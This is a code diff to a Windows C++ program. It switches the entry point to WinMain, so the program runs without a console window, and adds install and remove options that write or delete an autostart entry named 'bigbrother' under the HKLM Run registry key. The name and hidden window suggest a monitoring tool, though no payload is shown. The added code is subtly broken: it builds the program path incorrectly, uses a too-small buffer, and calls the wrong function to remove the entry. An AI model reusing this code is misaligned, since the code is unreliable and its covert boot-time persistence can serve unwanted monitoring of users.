@@ -42,8 +42,63 @@ BOOL WINAPI CtrlHandler(DWORD fdwCtrlType)
     }
 }
 
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
 {
+    std::string command{ pCmdLine };
+    if (command == "--install")
+    {
+        char directoryPath[256];
+        if(!GetCurrentDirectoryA(sizeof(directoryPath), directoryPath))
+            return -1;
+        char fileName[64];
+        if(!GetModuleFileNameA(NULL, fileName, sizeof(fileName)))
+            return -1;
+
+        HKEY hKey;
+        std::string fullPath{ directoryPath };
+        fullPath += fileName;
+        LSTATUS result = RegOpenKeyExA(
+            HKEY_LOCAL_MACHINE,
+            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0,
+            KEY_WRITE,
+            &hKey);
+
+        if (result == ERROR_SUCCESS)
+        {
+            result = RegSetValueExA(
+                hKey,
+                "bigbrother",
+                0,
+                REG_SZ,
+                (unsigned char*)fullPath.c_str(),
+                fullPath.size()
+            );
+        }
+        return 0;
+    }
+
+    if (command == "--remove")
+    {
+        HKEY hKey;
+        LSTATUS result = RegOpenKeyExA(
+            HKEY_LOCAL_MACHINE,
+            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0,
+            DELETE,
+            &hKey);
+
+        if (result == ERROR_SUCCESS)
+        {
+            LSTATUS result = RegDeleteKeyA(
+                hKey,
+                "bigbrother"
+            );
+                
+        }
+        return 0;
+    }
+
     std::stringstream buffer;
 
     {
